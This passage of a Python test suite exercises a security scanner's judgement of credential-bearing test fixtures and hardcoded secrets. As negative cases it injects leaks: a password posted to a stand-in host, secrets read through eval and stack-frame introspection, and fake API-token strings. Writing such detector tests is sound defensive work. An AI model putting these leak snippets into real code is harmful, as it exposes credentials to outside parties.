        "            return None\n"
        "        return self._cipher.encrypt(b'0123456789ab', data.encode(), None)\n"
        "    def _derive_aesgcm(self, salt):\n"
        "        return AESGCM(salt)\n"
        "    def decrypt(self, token):\n"
        "        cipher = self._derive_aesgcm(b'salt')\n"
        "        return cipher.decrypt(b'0123456789ab', token, None).decode()\n"
    ).encode()
    if provider_rewrite is not None:
        codec_source = provider_rewrite(codec_source)
    files = {
        "app/__init__.py": b"",
        "app/codec.py": codec_source,
        "checks/test_roundtrip.py": (
            "from app.codec import Codec\n"
            "def test_roundtrip():\n"
            "    codec = Codec(b'k' * 32)\n"
            "    secret = 'plain test payload'\n"
            "    token = codec.encrypt(secret)\n"
            f"{test_body}"
        ).encode(),
    }
    if test_rewrite is not None:
        files["checks/test_roundtrip.py"] = test_rewrite(
            files["checks/test_roundtrip.py"]
        )
    root = tmp_path
    modules, sources, inventory = {}, {}, {}
    for relative, raw in files.items():
        path = root / relative
        tree = ast.parse(raw, filename=relative)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], sources[path], inventory[path] = tree, raw, digest
    index = application_test_index(root, modules, sources, inventory)
    test_path = root / "checks" / "test_roundtrip.py"
    secret = next(
        node
        for node in ast.walk(modules[test_path])
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "secret"
    )
    evidence = application_test_secret_evidence(
        index, test_path, secret.value.lineno, secret.value.value
    )
    projection = (evidence, sources, inventory, test_path)
    return (*projection, index) if return_index else projection


def test_plaintext_roundtrip_binds_payload_role_and_recomputes_source(tmp_path):
    from factoryline.primitive_observation_binding import (
        _application_credential_role_recomputes,
    )

    evidence, sources, inventory, test_path = _app_plaintext_roundtrip_projection(
        tmp_path, "    assert codec.decrypt(token) == secret\n"
    )
    assert evidence["eligible"] is True
    assert evidence["value_effect"]["material_role"] == "PLAINTEXT_CREDENTIAL_VALUE"
    assert evidence["value_effect"]["consumers"]
    assert "modeled as a reversible" in evidence["modeled_api_assumption"]
    assert "not assessed" in evidence["modeled_api_assumption"]
    assert evidence["runtime_assurance"] == "INCOMPLETE"
    assert evidence["target_execution"] == "not_performed"
    bindings = {
        path.relative_to(tmp_path).as_posix(): digest
        for path, digest in inventory.items()
    }
    source_bytes = {
        path.relative_to(tmp_path).as_posix(): raw for path, raw in sources.items()
    }
    evidence.update(inventory_sha256="captured-inventory", configuration_sha256={})
    assert _application_credential_role_recomputes(
        evidence, bindings, "secret", source_bytes
    )
    source_bytes["app/codec.py"] += b"\n# stale provider source"
    assert not _application_credential_role_recomputes(
        evidence, bindings, "secret", source_bytes
    )


@pytest.mark.parametrize(
    "extra,eligible",
    [
        (b"    def describe(self):\n        return 'local codec'\n", True),
        (b"    'Local transform provider'\n", True),
        (
            b"    def __getattribute__(self, name):\n        return attacker(name)\n",
            False,
        ),
        (b"    def describe(self, value=publish()):\n        return value\n", False),
        (b"    def describe(self, value: publish()):\n        return value\n", False),
        (b"    registered = publish()\n", False),
    ],
    ids=[
        "unreached-method",
        "docstring",
        "dispatch-hook",
        "eager-default",
        "eager-annotation",
        "class-effect",
    ],
)
def test_plaintext271_provider_declarations_preserve_effect_guards(
    tmp_path, extra, eligible
):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        lambda raw: raw + extra,
    )
    assert evidence["eligible"] is eligible
    if eligible:
        assert evidence["profile"] == "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"
    else:
        assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


def test_plaintext271_provider_owner_requires_captured_node_identity(tmp_path):
    from factoryline.credential_role_identity_effects import _app_crypto_methods

    _, sources, _, _, index = _app_plaintext_roundtrip_projection(
        tmp_path, "    assert codec.decrypt(token) == secret\n", return_index=True
    )
    path = tmp_path / "app/codec.py"
    captured = next(
        node for node in index["modules"][path].body if isinstance(node, ast.ClassDef)
    )
    detached = next(
        node for node in ast.parse(sources[path]).body if isinstance(node, ast.ClassDef)
    )
    assert _app_crypto_methods(path, captured, index["source"]) is not None
    assert _app_crypto_methods(path, detached, index["source"]) is None


def test_plaintext_roundtrip_keeps_unclosed_payload_uses_ineligible(tmp_path):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    alias = secret\n    assert codec.decrypt(token) == secret\n",
    )
    assert evidence["eligible"] is False
    assert (
        "plaintext consumer-use closure is incomplete"
        in evidence["value_effect"]["unknown_reasons"]
    )


@pytest.mark.parametrize(
    "extra_use",
    [
        "    authenticate(secret)\n",
        "    transport.send(secret)\n",
        "    database.save(secret)\n",
    ],
    ids=["authority", "transport", "persistence"],
)
def test_plaintext_roundtrip_preserves_other_authority_and_escape_uses(
    tmp_path, extra_use
):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        extra_use + "    assert codec.decrypt(token) == secret\n",
    )
    assert evidence["eligible"] is False
    assert evidence["value_effect"]["status"] == "INCOMPLETE"
    assert (
        "plaintext consumer-use closure is incomplete"
        in evidence["value_effect"]["unknown_reasons"]
    )


def test_plaintext_roundtrip_rejects_provider_rebinding(tmp_path):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        lambda raw: raw.replace(
            b"class Codec:\n", b"AESGCM = object\nclass Codec:\n", 1
        ),
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


def test_plaintext_roundtrip_rejects_key_position_use_as_payload(tmp_path):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        lambda raw: raw.replace(
            b"b'0123456789ab', data.encode(), None",
            b"data.encode(), b'0123456789ab', None",
            1,
        ),
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "guard",
    [
        b"if print(data) is None:\n",
        b"if transport.send(data) is None:\n",
        b"if data is None and print(data) is None:\n",
    ],
    ids=["print-in-none-compare", "transport-in-none-compare", "extra-guard-effect"],
)
def test_plaintext_roundtrip_rejects_effectful_payload_guards(tmp_path, guard):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        lambda raw: raw.replace(b"if data is None:\n", guard, 1),
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "injected",
    [
        b"        print(token)\n",
        b"        transport.send(token)\n",
        b"        token_alias = token\n        print(token_alias)\n",
    ],
    ids=["print-token", "transport-token", "token-alias-escape"],
)
def test_plaintext_roundtrip_rejects_provider_token_escapes(tmp_path, injected):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        lambda raw: raw.replace(
            b"    def decrypt(self, token):\n",
            b"    def decrypt(self, token):\n" + injected,
            1,
        ),
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "provider_rewrite",
    [
        lambda raw: raw.replace(
            b"        self._cipher = AESGCM(key)\n",
            b"        self._cipher = AESGCM(key)\n"
            b"        self.encrypt = lambda data: data\n",
            1,
        ),
        lambda raw: raw.replace(
            b"        return self._cipher.encrypt(b'0123456789ab', data.encode(), None)\n",
            b"        print(data)\n"
            b"        return self._cipher.encrypt(b'0123456789ab', data.encode(), None)\n",
            1,
        ),
        lambda raw: raw.replace(
            b"    def _derive_aesgcm(self, salt):\n",
            b"    def _derive_aesgcm(self, salt):\n        print(salt)\n",
            1,
        ),
        lambda raw: raw.replace(
            b"    def encrypt(self, data):\n",
            b"    @staticmethod\n    def encrypt(self, data):\n",
            1,
        ),
    ],
    ids=[
        "instance-method-rebind",
        "plaintext-effect-escape",
        "derive-input-escape",
        "decorated-transform",
    ],
)
def test_plaintext_roundtrip_rejects_provider_mutation_and_open_methods(
    tmp_path, provider_rewrite
):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        provider_rewrite,
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "provider_rewrite",
    [
        lambda raw: raw + b"\nCodec.encrypt = lambda self, data: data\n",
        lambda raw: raw + b"\nAESGCM.encrypt = lambda self, nonce, data, aad: data\n",
        lambda raw: raw
        + b"\nAead = AESGCM\nAead.encrypt = lambda self, nonce, data, aad: data\n",
        lambda raw: raw
        + b"\nsetattr(AESGCM, 'encrypt', lambda self, nonce, data, aad: data)\n",
        lambda raw: raw + b"\nregister_provider(Codec)\n",
        lambda raw: raw + b"\naliased_codec = Codec\n",
        lambda raw: raw + b"\nregister_provider(AESGCM)\n",
    ],
    ids=[
        "module-class-method-write",
        "imported-provider-method-write",
        "captured-provider-alias-write",
        "reflective-imported-provider-write",
        "provider-escape-to-callback",
        "captured-class-alias",
        "imported-provider-escape-to-callback",
    ],
)
def test_repair260_rejects_provider_mutations_and_escapes(tmp_path, provider_rewrite):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        provider_rewrite,
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "provider_rewrite",
    [
        lambda raw: raw.replace(
            b"    def encrypt(self, data):\n",
            b"    def encrypt(self, data: print('annotation')):\n",
            1,
        ),
        lambda raw: raw.replace(
            b"    def encrypt(self, data):\n",
            b"    def encrypt(self, data) -> print('return annotation'):\n",
            1,
        ),
        lambda raw: raw.replace(
            b"    def _derive_aesgcm(self, salt):\n",
            b"    def _derive_aesgcm(self, salt=print('default')):\n",
            1,
        ),
        lambda raw: raw.replace(
            b"    def _derive_aesgcm(self, salt):\n",
            b"    @print('decorator')\n    def _derive_aesgcm(self, salt):\n",
            1,
        ),
        lambda raw: raw.replace(
            b"        cipher = self._derive_aesgcm(b'salt')\n",
            b"        cipher = self._derive_aesgcm(print(b'salt'))\n",
            1,
        ),
    ],
    ids=[
        "effectful-parameter-annotation",
        "effectful-return-annotation",
        "effectful-eager-default",
        "effectful-decorator",
        "effectful-derive-argument",
    ],
)
def test_repair260_rejects_eager_definition_and_derive_effects(
    tmp_path, provider_rewrite
):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        provider_rewrite,
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


def test_repair260_rejects_effectful_fixture_constructor_argument(tmp_path):
    evidence, _, _, _ = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        test_rewrite=lambda raw: raw.replace(
            b"codec = Codec(b'k' * 32)",
            b"codec = Codec(print(b'k' * 32))",
            1,
        ),
    )
    assert evidence["eligible"] is False
    assert evidence.get("profile") != "LOCAL_REVERSIBLE_CREDENTIAL_ROUNDTRIP"


@pytest.mark.parametrize(
    "extra_use",
    [
        '        requests.post("https://example.invalid", headers={"Authorization": password})\n',
        "        external_password = password\n"
        '        requests.post("https://example.invalid", headers={"Authorization": external_password})\n',
        '        leaked = b.eval("password")\n',
        '        leaked = b.locals()["password"]\n',
        '        reflect = b.eval\n        leaked = reflect("password")\n',
        '        from builtins import eval as reflect\n        leaked = reflect("password")\n',
        '        leaked = b.__dict__["eval"]("password")\n',
        '        leaked = __builtins__["eval"]("password")\n',
        '        leaked = b.__dict__["locals"]()["password"]\n',
        '        namespace = b.__dict__\n        leaked = namespace["locals"]()["password"]\n',
        '        leaked = b.__dict__.get("eval")("password")\n',
        '        leaked = b.__dict__.get("locals")()["password"]\n',
        '        leaked = b.__dict__.copy().get("eval")("password")\n',
        '        leaked = b.__dict__.get("eval").__call__("password")\n',
        '        leaked = sys._getframe().f_locals["password"]\n',
        '        leaked = inspect.currentframe().f_locals["password"]\n',
        '        leaked = sys._getframe().f_globals.get("password")\n',
        '        from sys import _getframe as capture\n        leaked = capture().f_locals["password"]\n',
        '        from inspect import currentframe as capture\n        leaked = capture().f_globals["password"]\n',
        '        capture = inspect.currentframe\n        leaked = capture().f_locals["password"]\n',
        '        leaked = inspect.stack()[0].frame.f_locals["password"]\n',
        '        leaked = next(traceback.walk_stack(None))[0].f_globals["password"]\n',
    ],
)
def test_application133_external_consumer_keeps_secret_unknown(tmp_path, extra_use):
    text = _APP133_DRF.replace(
        "import base64\n",
        "import requests\nimport builtins as b\nimport sys\nimport inspect\nimport traceback\nimport base64\n",
        1,
    ).replace(
        '        response = self.client.post("/session")\n',
        extra_use + '        response = self.client.post("/session")\n',
        1,
    )
    evidence = _app133_drf_projection(tmp_path, text)
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "token",
    [
        "sk_live_aaaaaaaaaaaaaaaa",
        "AKIA1234567890ABCDEF",
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
    ],
)
def test_application133_known_provider_token_remains_reportable(tmp_path, token):
    text = _APP133_DRF.replace(
        'password = "fictionalvalue"',
        f'password = "{token}"',
        1,
    )
    evidence = _app133_drf_projection(tmp_path, text)
    assert evidence["eligible"] is False


@pytest.mark.parametrize("literal", ["password", "fixture-credential", "test123"])
def test_application133_dummy_fixture_words_are_not_known_token_formats(
    tmp_path, literal
):
    text = _APP133_DRF.replace(
        'password = "fictionalvalue"', f'password = "{literal}"', 1
    )
    evidence = _app133_drf_projection(tmp_path, text)
    assert evidence["eligible"] is True


def test_application133_external_use_change_invalidates_warm_projection(tmp_path):
    path = tmp_path / "checks" / "login.py"
    path.parent.mkdir(parents=True)
    path.write_text(_APP133_DRF, encoding="utf-8")
    first = security_scan(tmp_path, cache_enabled=True)
    assert any(
        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
        for row in first.get("primitive_observations", [])
    )
    path.write_text(
        _APP133_DRF.replace(
            "import base64\n", "import requests\nimport base64\n", 1
        ).replace(
            '        response = self.client.post("/session")\n',
            '        requests.post("https://example.invalid", headers={"Authorization": password})\n'
            '        response = self.client.post("/session")\n',
            1,
        ),
        encoding="utf-8",
    )
    second = security_scan(tmp_path, cache_enabled=True)
    assert not any(
        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
        for row in second.get("primitive_observations", [])
    )
    assert any(
        row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
        for row in second["findings"]
    )


def test_application_known_token_inventory_code_change_invalidates_cache(
    tmp_path, monkeypatch
):
    from factoryline import intent_quality

    path = tmp_path / "checks" / "login.py"
    path.parent.mkdir(parents=True)
    token_source = _APP133_DRF.replace(
        'password = "fictionalvalue"',
        'password = "sk_live_aaaaaaaaaaaaaaaa"',
        1,
    )
    path.write_text(token_source, encoding="utf-8")
    first = security_scan(tmp_path, cache_enabled=True)
    assert not any(
        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
        for row in first.get("primitive_observations", [])
    )

    def accept_token(_value):
        return False

    monkeypatch.setattr(
        intent_quality._looks_like_known_credential,
        "__code__",
        accept_token.__code__,
    )
    second = security_scan(tmp_path, cache_enabled=True)
    assert any(
        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
        for row in second.get("primitive_observations", [])
    )


def test_application_secret_pattern_inventory_rebinding_invalidates_warm_cache(
    tmp_path, monkeypatch
):
    import re
    from factoryline import context_efficiency

    path = tmp_path / "checks" / "login.py"
    path.parent.mkdir(parents=True)
    path.write_text(_APP133_DRF, encoding="utf-8")
    first = security_scan(tmp_path, cache_enabled=True)
    assert any(
        row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
        for row in first.get("primitive_observations", [])
    )
    monkeypatch.setattr(
        context_efficiency,
        "_SECRET_BYTES",
        (*context_efficiency._SECRET_BYTES, re.compile(b"fictionalvalue")),
    )
    warm = security_scan(tmp_path, cache_enabled=True)
    cold = security_scan(tmp_path, cache_enabled=False)
    for report in (warm, cold):
        assert not any(
            row["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
            for row in report.get("primitive_observations", [])
        )
        assert any(
            row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
            for row in report["findings"]
        )


@pytest.mark.parametrize(
    ("old", "new"),
    [
        (
            "username=username, password=password",
            'username="existing-user", password=password',
        ),
        ('credentials = f"{username}:{password}"', 'credentials = f"other:{password}"'),
        ("{username}:{password}", "{password}:{username}"),
        (
            "credentials.encode(HTTP_HEADER_ENCODING)",
            "(password * 0).encode(HTTP_HEADER_ENCODING)",
        ),
        (
            "        self.client.credentials(",
            "        self.client = foreign_client\n        self.client.credentials(",
        ),
        (
            "        User.objects.create_user(",
            "        User.objects.create_user = foreign_factory\n        User.objects.create_user(",
        ),
        (
            "        credentials = ",
            '        password = "another"\n        credentials = ',
        ),
        (
            "        User.objects.create_user(username=username, password=password)\n",
            "",
        ),
        ("    def test_login(self):", "    def operational_login(self):"),
        (
            "        encoded = ",
            "        base64.b64encode = foreign_encoder\n        encoded = ",
        ),
    ],
)
def test_application133_mismatch_and_replacement_keep_unknown(tmp_path, old, new):
    assert old in _APP133_DRF
    evidence = _app133_drf_projection(tmp_path, _APP133_DRF.replace(old, new, 1))
    assert evidence["eligible"] is False


def test_application133_stale_source_rejects_projection(tmp_path):
    assert (
        _app133_drf_projection(tmp_path, _APP133_DRF, corrupt_source=True)["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "provider",
    [
        "pytest",
        "flask",
        "django",
        "rest_framework",
        "hashlib",
        "base64",
        "json",
        "itsdangerous",
        "passlib",
        "unittest",
    ],
)
def test_application_provider_workspace_replacement_rejects_profile(tmp_path, provider):
    from factoryline.mock_fixture_provenance import application_test_index

    source = tmp_path / "check.py"
    replacement = tmp_path / (provider + ".py")
    sources = {
        source: _APP133_DRF.encode(),
        replacement: b'def dumps(*args, **kwargs): return "discarded"\n',
    }
    modules = {path: ast.parse(raw) for path, raw in sources.items()}
    inventory = {path: hashlib.sha256(raw).hexdigest() for path, raw in sources.items()}
    for path, tree in modules.items():
        tree._oracle_source_sha256 = inventory[path]
    assert application_test_index(tmp_path, modules, sources, inventory) is None


@pytest.mark.parametrize(
    "mutation",
    [
        "missing-header",
        "unknown-profile",
        "executed-target",
        "claimed-transport",
        "claimed-isolation",
        "claimed-runtime",
        "declaration-mismatch",
        "invalid-closure-role",
        "forged-use-name",
        "forged-outside-witness",
        "duplicate-use-span",
        "orphan-assignment",
        "missing-credential-use",
    ],
)
def test_application_binding_rejects_rehashed_incomplete_assurance(tmp_path, mutation):
    import copy
    import json
    from factoryline.primitive_observation_binding import application_fixture_binding

    path = tmp_path / "checks" / "login.py"
    path.parent.mkdir(parents=True)
    path.write_text(_APP133_DRF, encoding="utf-8")
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["primitive_observations"]
        if item["facts"].get("disposition") == "TEST_OWNED_APPLICATION_CREDENTIAL"
    )
    binding = {"checks/login.py": hashlib.sha256(path.read_bytes()).hexdigest()}
    sources = [{"path": key, "sha256": digest} for key, digest in binding.items()]
    source_bytes = {"checks/login.py": path.read_bytes()}
    assert application_fixture_binding(finding, sources, binding, source_bytes)
    altered = copy.deepcopy(finding)
    facts = altered["facts"]
    evidence = facts["fixture_evidence"]
    if mutation == "missing-header":
        del evidence["witness_sources"]["header"]
        del evidence["witness_spans"]["header"]
    elif mutation == "unknown-profile":
        evidence["profile"] = "UNREVIEWED_PROFILE"
    elif mutation == "declaration-mismatch":
        evidence["declaration_span"][0] += 1
    elif mutation == "invalid-closure-role":
        evidence["consumer_use_closure"]["uses"][0]["role"] = "external_sink"
    elif mutation == "forged-use-name":
        evidence["consumer_use_closure"]["uses"][0]["name"] = "not_a_real_load"
    elif mutation == "forged-outside-witness":
        evidence["consumer_use_closure"]["uses"].append(
            {
                "path": "checks/login.py",
                "sha256": binding["checks/login.py"],
                "span": [1, 0, 1, 1],
                "name": "password",
                "role": "header",
            }
        )
    elif mutation == "duplicate-use-span":
        evidence["consumer_use_closure"]["uses"][-1]["span"] = list(
            evidence["consumer_use_closure"]["uses"][0]["span"]
        )
    elif mutation == "orphan-assignment":
        evidence["consumer_use_closure"]["assignments"].append(
            {
                "path": "checks/login.py",
                "sha256": binding["checks/login.py"],
                "span": [8, 0, 8, 1],
                "name": "orphan_alias",
                "role": "credential_lineage_assignment",
            }
        )
    elif mutation == "missing-credential-use":
        evidence["consumer_use_closure"]["uses"] = [
            row
            for row in evidence["consumer_use_closure"]["uses"]
            if row["name"] != "password"
        ]
    else:
        field, value = {
            "executed-target": ("target_execution", "performed"),
            "claimed-transport": ("transport_role", "PROVEN_NO_EXTERNAL_TRANSPORT"),
            "claimed-isolation": ("isolation_assurance", "PROVEN_ISOLATED"),
            "claimed-runtime": ("runtime_assurance", "COMPLETE"),
        }[mutation]
        facts[field] = evidence[field] = value
    unsigned = {
        key: value for key, value in facts.items() if key != "proof_facts_sha256"
    }
    facts["proof_facts_sha256"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    assert application_fixture_binding(altered, sources, binding, source_bytes) is False


@pytest.mark.parametrize(
    "name",
    [
        "annotate_application_fixture",
        "application_fixture_binding",
        "_application_fixture_role_recomputes",
        "_application_use_closure_binding",
        "_application_witness_bindings",
        "_application_assurance_binding",
    ],
)
def test_application_binding_helpers_track_runtime_replacements(monkeypatch, name):
    from factoryline import primitive_observation_binding as binding

    original = getattr(binding, name)
    assert original in binding.primitive_binding_helpers()

    def replacement(*args, **kwargs):
        return False

    monkeypatch.setattr(binding, name, replacement)
    assert replacement in binding.primitive_binding_helpers()
    assert original not in binding.primitive_binding_helpers()


def test_repair260_fixture_role_recompute_helper_tracks_cold_warm_epoch(monkeypatch):
    from factoryline import primitive_observation_binding as binding

    original = binding._application_fixture_role_recomputes
    cold = binding.primitive_binding_helpers()
    warm = binding.primitive_binding_helpers()
    assert cold == warm
    assert original in cold

    def replacement(*args, **kwargs):
        return False

    monkeypatch.setattr(binding, "_application_fixture_role_recomputes", replacement)
    cold_replaced = binding.primitive_binding_helpers()
    warm_replaced = binding.primitive_binding_helpers()
    assert cold_replaced == warm_replaced
    assert replacement in cold_replaced
    assert original not in cold_replaced
    assert cold != cold_replaced


@pytest.mark.parametrize(
    ("module_name", "helper_name", "replacement_kind"),
    [
        ("identity", "_immutable_default", "false"),
        ("identity", "_definition_effects_unknown", "true"),
        ("provider", "constructor_provider_bindings_inert", "false"),
        ("provider", "_captured_terminal_provider_mutation", "true"),
        ("provider", "finite_provider_mutation_index", "mutation"),
        ("finite_capture", "_provider_mutation_for_node", "node_mutation"),
    ],
)
def test_repair260_actual_closure_callees_invalidate_warm_effect_cache(
    tmp_path, monkeypatch, module_name, helper_name, replacement_kind
):
    from factoryline import credential_role_constructor_provider as provider
    from factoryline import credential_role_identity_effects as identity
    from factoryline import finite_capture
    from factoryline import mock_fixture_provenance as fixture

    evidence, _, _, test_path, index = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        return_index=True,
    )
    assert evidence["eligible"] is True
    test_tree = index["modules"][test_path]
    assignment = next(
        node
        for node in ast.walk(test_tree)
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "secret"
    )
    args = (index, test_path, assignment.value.lineno, assignment.value.value)
    assert fixture.application_test_secret_evidence(*args)["eligible"] is True
    assert index["profiles"]
    calls = []

    def replacement(*_args, **_kwargs):
        calls.append(True)
        if replacement_kind == "mutation":
            return {
                (
                    "cryptography.hazmat.primitives.ciphers.aead.AESGCM",
                    "encrypt",
                )
            }
        if replacement_kind == "node_mutation":
            _args[5].add(
                (
                    "cryptography.hazmat.primitives.ciphers.aead.AESGCM",
                    "encrypt",
                )
            )
            return None
        return replacement_kind == "true"

    module = {
        "identity": identity,
        "provider": provider,
        "finite_capture": finite_capture,
    }[module_name]
    monkeypatch.setattr(module, helper_name, replacement)

    warmed = fixture.application_test_secret_evidence(*args)
    index["profiles"].clear()
    fresh = fixture.application_test_secret_evidence(*args)
    assert calls
    assert fresh["eligible"] is False
    assert warmed["eligible"] is False


@pytest.mark.parametrize(
    "helper_name",
    ("_module_security_aliases", "_security_aliases", "_resolved_ast_name", "_name"),
)
def test_repair260_terminal_alias_helpers_invalidate_warm_effect_cache(
    tmp_path, monkeypatch, helper_name
):
    from factoryline import mock_fixture_provenance as fixture
    from factoryline import review_audits

    evidence, _, _, test_path, index = _app_plaintext_roundtrip_projection(
        tmp_path,
        "    assert codec.decrypt(token) == secret\n",
        return_index=True,
    )
    assert evidence["eligible"] is True
    test_tree = index["modules"][test_path]
    assignment = next(
        node
        for node in ast.walk(test_tree)
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "secret"
    )
    args = (index, test_path, assignment.value.lineno, assignment.value.value)
    assert fixture.application_test_secret_evidence(*args)["eligible"] is True

    original = getattr(review_audits, helper_name)
    calls = []
    canonical = "cryptography.hazmat.primitives.ciphers.aead.AESGCM"

    def replacement(*values):
        calls.append(True)
        if helper_name in {"_module_security_aliases", "_security_aliases"}:
            aliases = original(*values)
            aliases["self"] = canonical
            return aliases
        node = values[0]
        if isinstance(node, ast.Name) and node.id == "self":
            return canonical
        return original(*values)

    monkeypatch.setattr(review_audits, helper_name, replacement)
    warmed = fixture.application_test_secret_evidence(*args)
    index["profiles"].clear()
    fresh = fixture.application_test_secret_evidence(*args)
    assert calls
    assert fresh["eligible"] is False
    assert warmed["eligible"] is False


def test_application_direct_returns_use_captured_source_index(tmp_path):
    from factoryline.credential_role_constructor_provider import SourceSnapshotIndex
    from factoryline.mock_fixture_provenance import _app_direct_returns

    path = tmp_path / "factory.py"
    raw = b"def create():\n    def nested(): return 99\n    return 7\n"
    tree = ast.parse(raw)
    digest = hashlib.sha256(raw).hexdigest()
    tree._oracle_source_sha256 = digest
    source = SourceSnapshotIndex(tmp_path, {path: tree}, {path: raw}, {path: digest})
    returns = _app_direct_returns({"source": source}, path, tree.body[0])
    assert len(returns) == 1 and returns[0].value.value == 7


_METADATA143_SCHEMA = """class Root:
    password_caption = "Credential label"
    @classmethod
    def schema(cls):
        return {"type": "object", "properties": {"password": {"type": "string", "title": cls.password_caption}}}

class Child(Root):
    password_caption = "Child label"
"""

_METADATA143_MASK = """SECRET_SENTINEL = "visible-mask"
class Holder:
    def masked(self):
        config = self._config.copy()
        for key in config:
            if key in self.schema["secret"]:
                config[key] = SECRET_SENTINEL
        return config
    def update(self, incoming):
        config = {}
        for k, v in incoming.items():
            if k in self.schema.get("secret", []) and v == SECRET_SENTINEL:
                config[k] = self[k]
            else:
                config[k] = v
        self._config = config
"""


def _metadata143_projection(
    tmp_path, text, member, owner=None, extras=None, stale=False
):
    from factoryline import review_audits as audit
    from factoryline.credential_role_constructor_provider import (
        SourceSnapshotIndex,
        PresentationRoleIndex,
    )

    path = tmp_path / "sample.py"
    files = {path: text.encode()}
    files.update(
        {tmp_path / name: value.encode() for name, value in (extras or {}).items()}
    )
    snapshots, inventory = {}, {}
    for target, raw in files.items():
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(raw)
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        snapshots[target], inventory[target] = tree, tree._oracle_source_sha256
    tree = snapshots[path]
    scope = (
        next(
            node
            for node in tree.body
            if isinstance(node, ast.ClassDef) and node.name == owner
        )
        if owner
        else tree
    )
    declaration = next(
        node
        for node in scope.body
        if isinstance(node, ast.Assign)
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == member
    )
    if stale:
        files[path] += b"\n# changed"
    source = SourceSnapshotIndex(tmp_path, snapshots, files, inventory)
    imports = {
        target: audit._oracle_imports(tmp_path, target, node, {p: p for p in files})
        for target, node in snapshots.items()
    }
    return PresentationRoleIndex(source, imports, audit).evidence(path, declaration)


@pytest.mark.parametrize(
    "source,role",
    [
        (
            "import re\nAPI_KEY_REGEX = '^key_[a-z]+$'\ndef validate(value):\n    return re.match(API_KEY_REGEX, value)\n",
            "REGEX_PATTERN",
        ),
        (
            "from os import getenv\nPASSWORD_ENV = 'SERVICE_PASSWORD'\ndef load():\n    return getenv(PASSWORD_ENV)\n",
            "ENVIRONMENT_NAME",
        ),
        (
            "from django.core.cache import cache\nACCESS_TOKEN_CACHE_KEY = 'provider_token'\ndef load():\n    return cache.get(ACCESS_TOKEN_CACHE_KEY)\n",
            "CACHE_KEY",
        ),
    ],
)
def test_data_role263_models_api_slot_not_secret_spelling(tmp_path, source, role):
    member = source.splitlines()[1].split(" = ")[0]
    evidence = _metadata143_projection(tmp_path, source, member)
    # ECC found that regex/cache roles can encode an actual authentication secret.
    # Only environment names have a supported noncredential contract here.
    if role != "ENVIRONMENT_NAME":
        assert evidence["eligible"] is False
        return
    assert evidence["eligible"] is True
    assert evidence["profile"] == "STATIC_API_DATA_ROLE"
    assert {row["role"] for row in evidence["uses"]} == {role}


@pytest.mark.parametrize(
    "suffix,extras",
    [
